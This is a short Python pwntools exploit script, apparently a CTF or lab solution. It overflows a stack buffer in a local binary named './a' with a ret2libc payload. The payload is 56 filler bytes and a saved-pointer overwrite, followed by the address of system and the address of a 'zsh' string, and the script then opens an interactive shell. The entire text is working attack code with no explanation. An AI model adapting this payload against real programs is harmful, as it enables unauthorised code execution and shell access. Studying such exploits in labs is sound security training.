from pwn import *


zsh_addr = 0x0804c02c

system_addr = 0x08049070

payload = 'a' * 56 + 'bbbb' + p32(system_addr) + 'aaaa' + p32(zsh_addr)


sh = process(argv=['./a',payload])

sh.interactive()
